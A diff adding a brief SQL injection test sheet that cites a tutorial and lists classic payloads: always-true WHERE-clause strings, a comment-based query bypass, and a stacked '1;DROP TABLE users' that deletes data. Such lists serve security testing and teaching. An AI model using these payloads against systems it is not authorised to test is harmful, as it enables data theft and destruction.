@@ -1,0 +1,21 @@
+Test sheet SQL injection
+
+http://unixwiz.net/techtips/sql-injection.html
+
+
+
+WHERE CLAUSE:
+-------------
+' OR 1=1--
+
+OF
+-------------
+foo' OR 'bar'='bar
+
+
+OR USING COMMENTS TO EVEN BLOCK THE REST OF THE QUERY:
+------------------------------------------------------
+' or '1'='1';/*'
+
+
+1;DROP TABLE users
